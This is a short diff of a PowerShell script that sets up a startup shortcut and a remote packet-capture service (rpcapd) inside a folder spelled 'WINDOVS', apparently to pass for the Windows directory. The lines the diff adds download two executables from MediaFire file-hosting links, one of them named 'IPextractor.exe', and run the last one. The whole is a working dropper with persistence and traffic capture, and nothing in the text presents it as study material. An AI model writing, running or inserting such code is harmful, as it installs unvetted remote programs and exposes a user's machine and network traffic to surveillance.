@@ -8,4 +8,12 @@ $Shortcut = $WshShell.CreateShortcut("C:\Users\$env:UserName\AppData\Roaming\Mic
 $Shortcut.TargetPath = "c:\WINDOVS\WinPcap\rpcapd.exe"
 $Shortcut.Save()
 Start-Service rpcapd
+
+$uri = "http://download1514.mediafire.com/oqtolo5mmqdg/9diuj739n0ea1y7/Start+Services.exe"
+$out = "c:\WINDOVS\WinPcap\Start services.exe"
+Invoke-WebRequest -Uri $uri -OutFile $out
+
+$uri = "http://download1582.mediafire.com/5pgapqrqiteg/uo5yvbo3r8g6dtp/IPextractor.exe"
+$out = "C:\Users\$env:UserName\Desktop\IPextractor.exe"
+Invoke-WebRequest -Uri $uri -OutFile $out
 & $out
